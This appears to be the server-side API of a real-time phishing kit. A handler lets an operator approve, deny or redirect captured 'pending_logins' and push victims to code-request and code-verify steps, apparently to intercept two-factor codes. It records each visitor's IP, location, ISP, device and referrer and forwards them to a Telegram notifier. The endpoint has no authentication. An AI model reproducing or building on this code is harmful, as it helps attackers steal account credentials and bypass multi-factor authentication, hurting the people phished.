import { getDb, ensureTable } from "../../_db.js";
import { notifyAdvance } from "../../_telegram.js";

var cors = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Methods": "GET, PATCH, OPTIONS",
  "Access-Control-Allow-Headers": "Content-Type, Authorization",
};

function json(data, status) {
  return new Response(JSON.stringify(data), {
    status: status || 200,
    headers: Object.assign({ "Content-Type": "application/json" }, cors),
  });
}

export async function onRequestOptions() {
  return new Response(null, { status: 204, headers: cors });
}

export async function onRequestGet(context) {
  try {
    var id = context.params.id;
    var sql = getDb(context.env);
    var rows = await sql`SELECT * FROM pending_logins WHERE id = ${id}`;
    if (rows.length === 0) return json({ error: "Task not found" }, 404);
    return json({ task: rows[0] });
  } catch (error) {
    console.error("GET /api/tasks/[id] error:", error);
    return json({ error: "Failed to fetch task" }, 500);
  }
}

export async function onRequestPatch(context) {
  try {
    var id = context.params.id;
    var body = await context.request.json();

    if (body.advance_to) {
      return handleAdvance(context, id, body);
    }
    return handleStatusUpdate(context, id, body);
  } catch (error) {
    console.error("PATCH /api/tasks/[id] error:", error);
    return json({ error: "Failed to update task" }, 500);
  }
}

async function handleStatusUpdate(context, id, body) {
  var status = body.status;
  var resolved_by = body.resolved_by || "admin";
  var validStatuses = ["approved", "denied", "redirected"];

  if (validStatuses.indexOf(status) === -1) {
    return json({ error: "status must be one of: " + validStatuses.join(", ") }, 400);
  }

  var sql = getDb(context.env);
  var rows = await sql`
    UPDATE pending_logins
    SET status = ${status},
        resolved_at = ${Date.now()},
        resolved_by = ${resolved_by}
    WHERE id = ${id}
    RETURNING *
  `;

  if (rows.length === 0) return json({ error: "Task not found" }, 404);
  return json({ task: rows[0] });
}

async function handleAdvance(context, id, body) {
  var advance_to = body.advance_to;
  var code_delivery_method = body.code_delivery_method;
  var verification_code = body.verification_code;
  var validSteps = ["code_request", "code_verify"];

  if (validSteps.indexOf(advance_to) === -1) {
    return json({ error: "advance_to must be one of: " + validSteps.join(", ") }, 400);
  }

  var sql = getDb(context.env);
  var now = Date.now();
  var rows;

  if (advance_to === "code_request") {
    rows = await sql`
      UPDATE pending_logins
      SET flow_step = ${advance_to},
          code_delivery_method = ${code_delivery_method || null},
          status = 'pending',
          resolved_at = ${null},
          resolved_by = ${null},
          pending_since = ${now}
      WHERE id = ${id}
      RETURNING *
    `;
  } else {
    rows = await sql`
      UPDATE pending_logins
      SET flow_step = ${advance_to},
          verification_code = ${verification_code || null},
          status = 'pending',
          resolved_at = ${null},
          resolved_by = ${null},
          pending_since = ${now}
      WHERE id = ${id}
      RETURNING *
    `;
  }

  if (rows.length === 0) return json({ error: "Task not found" }, 404);
  var task = rows[0];

  var cf = context.request.cf || {};
  var clientIp = context.request.headers.get("cf-connecting-ip") || "Unknown";
  task.cf = {
    ip: clientIp,
    country: cf.country || "Unknown",
    city: cf.city || "Unknown",
    timezone: cf.timezone || "Unknown",
    asOrganization: cf.asOrganization || "Unknown",
  };
  task.device_info = body.device_info || task.device_info || null;
  task.screen_size = body.screen_size || task.screen_size || null;
  task.referrer = body.referrer || task.referrer || null;

  context.waitUntil(notifyAdvance(context.env, task));

  return json({ task: task });
}
